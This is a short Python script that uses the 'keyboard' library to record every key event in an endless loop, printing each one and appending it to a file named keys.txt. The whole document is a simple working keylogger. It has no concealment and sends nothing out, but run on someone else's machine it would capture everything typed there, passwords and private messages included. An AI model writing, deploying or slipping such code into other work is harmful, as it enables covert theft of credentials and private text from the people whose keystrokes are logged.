import keyboard as keyl

while True:
    logger = keyl.read_event()
    print(logger)
    with open('keys.txt', 'a') as f:
        f.write(str(logger) + '\n')


